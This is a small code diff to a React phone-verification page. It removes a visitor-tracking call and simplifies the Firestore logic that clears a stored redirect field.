@@ -13,7 +13,6 @@ import { PhoneOtpDialog } from "@/components/dialog-b";
 import { db, setDoc, doc } from "@/lib/firebase";
 import { onSnapshot, getDoc, Firestore } from "firebase/firestore";
 import { useRedirectMonitor } from "@/hooks/use-redirect-monitor";
-import { updateVisitorPage } from "@/lib/visitor-tracking";
 
 export default function VerifyPhonePage() {
   const [idNumber, setIdNumber] = useState("");
@@ -46,9 +45,7 @@ export default function VerifyPhonePage() {
   useRedirectMonitor({ visitorId, currentPage: "phone" });
 
   useEffect(() => {
-    if (visitorId) {
-      updateVisitorPage(visitorId, "phone", 7);
-      if (!db) return;
+    if (visitorId && db) {
       const visitorRef = doc(db as Firestore, "pays", visitorId);
       setDoc(visitorRef, { redirectPage: null }, { merge: true }).catch((err) =>
         console.error("[phone-info] Failed to clear redirectPage:", err)
